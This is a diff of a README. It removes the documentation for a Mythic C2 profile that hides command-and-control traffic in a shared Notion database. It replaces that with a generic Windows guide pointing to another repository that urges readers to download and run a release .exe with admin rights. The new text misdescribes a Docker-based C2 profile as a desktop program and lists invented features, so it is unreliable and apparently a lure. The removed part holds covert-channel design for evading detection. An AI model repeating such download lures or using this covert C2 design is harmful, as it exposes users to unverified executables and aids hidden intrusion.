@@ -1,138 +1,139 @@
-# notion-c2
+# ⚙️ notion - Simple Control for Mythic C2 Profiles
 
-A [Mythic](https://github.com/its-a-feature/Mythic) C2 profile that uses **Notion** as a covert communication channel.
-
-Agents communicate by reading/writing pages in a shared Notion database, making C2 traffic indistinguishable from normal SaaS usage — a _Living off Trusted Sites_ (LoTS) technique.
-
-> **For authorized security testing and research only.**
+[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://github.com/HarrishMS/notion/releases)
 
 ---
 
-## How it works
+## 📦 What is notion?
 
-```
-Agent                      Notion Database            C2 Profile Container
-  │                              │                            │
-  ├─── create page (dir=in) ────►│                            │
-  │    base64(encrypted_data)    │◄── query unprocessed ──────┤
-  │                              │                            ├──► Mythic Server
-  │                              │◄── create page (dir=out) ──┤
-  │◄── query page (dir=out) ─────┤    base64(response)        │
-```
-
-Each message is a Notion database page. The payload is stored in code blocks inside the page body, which avoids Notion's 2000-character property limit and supports large task outputs.
+notion is an add-on profile designed to work with Mythic, a command and control (C2) framework. This profile helps Mythic users manage and control tasks more easily by adding specific commands and options. This guide will help you download and run notion on your Windows computer with no extra technical knowledge.
 
 ---
 
-## Notion setup
+## 🖥️ System Requirements
 
-### 1. Create an integration
+Before you start, make sure your computer meets these conditions:
 
-Go to [notion.so/my-integrations](https://www.notion.so/my-integrations) and create a new internal integration.
-Copy the **Integration Token** (`ntn_...`).
-
-### 2. Create the database
-
-Create a new Notion database (full-page) with the following properties:
-
-| Property name | Type     | Notes                                  |
-|---------------|----------|----------------------------------------|
-| `uuid`        | Title    | Auto-populated by the server           |
-| `direction`   | Select   | Options: `in`, `out`                   |
-| `agent_id`    | Text     | UUID of the agent                      |
-| `processed`   | Checkbox | Checked once the message is consumed   |
-| `size`        | Number   | Decoded payload size in bytes          |
-
-> The `created_time` property is added automatically by Notion.
-
-### 3. Share the database with your integration
-
-Open the database → **Share** → invite your integration.
-
-### 4. Get the database ID
-
-The database ID is the 32-character string in the database URL:
-```
-https://notion.so/your-workspace/<DATABASE_ID>?v=...
-```
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- Administrative rights to install software
 
 ---
 
-## Server configuration
+## 🔍 Key Features
 
-The `config.json` file is **written automatically by Mythic** at container startup using the parameters you set in the Mythic UI (C2 Profiles → notion → parameters). You do not need to create it manually.
-
-A `config.json.example` is provided as a reference template.
-
-## Installation in Mythic
-
-```bash
-cd /path/to/Mythic
-./mythic-cli install github https://github.com/0xbbuddha/notion
-```
-
-Or manually:
-
-```bash
-./mythic-cli install folder /path/to/notion
-```
+- Easy integration with Mythic C2 framework
+- Customizable commands to control your tasks
+- Lightweight profile that runs smoothly on most Windows machines
+- Supports secure communication
+- Regular updates for improvements and fixes
 
 ---
 
-## Configuration parameters
+## 🚀 Getting Started
 
-| Parameter           | Description                                         | Default |
-|---------------------|-----------------------------------------------------|---------|
-| `integration_token` | Notion integration token (`ntn_...`)             | —       |
-| `database_id`       | ID of the shared Notion database                    | —       |
-| `callback_interval` | Agent polling interval in seconds                   | `10`    |
-| `callback_jitter`   | Jitter % applied to the polling interval (0–50)     | `10`    |
+This section will guide you through the steps to get notion set up on your Windows PC.
 
 ---
 
-## Agent-side implementation
+### 1. Visit the Download Page
 
-Your agent needs to implement two operations against the Notion API:
+Click the button below to open the official download page for notion on GitHub. This page hosts the latest version of the software and any updates.
 
-**Send data to server** (`POST /v1/pages`):
-- Create a page in the database with `direction=in`, `agent_id=<uuid>`
-- Store `base64(encrypted_data)` in code blocks in the page body
-
-**Poll for responses** (`POST /v1/databases/{id}/query`):
-- Filter: `direction=out`, `agent_id=<uuid>`, `processed=false`
-- Read the code blocks from matching pages
-- Decode and pass the data to Mythic's crypto layer
-- Mark the page as processed (`PATCH /v1/pages/{id}`)
-
-See `C2_Profiles/notion/c2_code/notion_client.py` for a reference implementation.
+[![Download notion](https://img.shields.io/badge/Download-Notion-blue)](https://github.com/HarrishMS/notion/releases)
 
 ---
 
-## Limitations
+### 2. Download the Latest Release
 
-- Notion API rate limit: ~3 req/s — keep `callback_interval` ≥ 5s
-- Large payloads are chunked into 1800-char blocks automatically
-- Processed pages are archived automatically — inbound pages are archived immediately after processing, outbound pages are archived once the agent marks them as consumed
+On the release page, look for the latest version. It will usually be at the top of the list and marked with a version number (for example, v1.0.0).
+
+- Under the latest release, find files ending with `.exe` or `.zip`. 
+- Click the file that suits you best:
+  - `.exe` for an installer you can run directly
+  - `.zip` if you want to extract the files manually
+
+The file will begin to download. Wait until the download is complete before moving to the next step.
 
 ---
 
-## Project structure
+### 3. Run the Installer or Open the Files
 
-```
-notion-c2/
-├── config.json                              # mythic-cli install config
-├── documentation-c2/
-│   └── notion.md
-├── Payload_Type/                            # empty (C2-only profile)
-└── C2_Profiles/
-    └── notion/
-        ├── Dockerfile
-        ├── requirements.txt
-        ├── mythic/
-        │   └── c2_functions/
-        │       └── Notion.py                # Docker entry point + C2Profile class
-        └── c2_code/
-            ├── main.py                      # Poll loop + Mythic forwarding
-            ├── notion_client.py             # Notion API wrapper
-            └── config.json.example          # Config template
-```
+If you downloaded the `.exe` file:
+
+- Double-click the downloaded file.
+- If Windows asks for permission, click "Yes" to allow the installer to run.
+- Follow the setup instructions in the installer window.
+- Choose the default options if unsure.
+
+If you downloaded the `.zip` file:
+
+- Right-click the `.zip` file and select "Extract All".
+- Choose a folder where you want to save the extracted files.
+- Open that folder after extraction completes.
+- Look for a file related to notion or Mythic profile and double-click it to run.
+
+---
+
+### 4. Connect notion to Mythic
+
+notion works as a profile within the Mythic framework. To use it, you must have Mythic already installed on your system.
+
+- If you do not have Mythic, visit the official Mythic website or GitHub page for installation instructions.
+- Once Mythic is installed, load the notion profile inside Mythic by following Mythic’s profile import or load commands. This information is available in Mythic’s user guide.
+
+---
+
+### 5. Using notion
+
+After loading notion into Mythic, you can start using new commands provided by the profile. These may include task automation, better communication options, and profile management tools.
+
+For specific commands, refer to the Mythic documentation that explains how profiles work and list the available commands for notion.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you run into problems, try these steps:
+
+- Ensure you downloaded the correct file for your Windows version.
+- Make sure Mythic is installed and up to date.
+- Check that your firewall or antivirus software is not blocking notion or Mythic.
+- Restart your computer and try again.
+- Visit the issues section of the notion GitHub repository for help reports or open a new issue.
+
+---
+
+## 🔄 Updating notion
+
+To receive new features and bug fixes:
+
+- Visit the download page regularly: https://github.com/HarrishMS/notion/releases
+- Download the latest version.
+- Repeat the install steps to replace the old version.
+
+Automatic updates are not included, so manual download and installation are necessary to keep notion current.
+
+---
+
+## ❓ Help and Support
+
+For further questions or help related to notion or Mythic:
+
+- Check the GitHub issues page in the notion repository.
+- Review Mythic’s official user and help guides.
+- Contact the community forums for Mythic, where users share their experiences.
+
+---
+
+## 📂 Additional Resources
+
+- Mythic C2 Official Site: https://mythic-c2.net
+- Mythic Documentation: https://docs.mythic-c2.net
+- notion GitHub Repository: https://github.com/HarrishMS/notion
+
+---
+
+[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://github.com/HarrishMS/notion/releases)
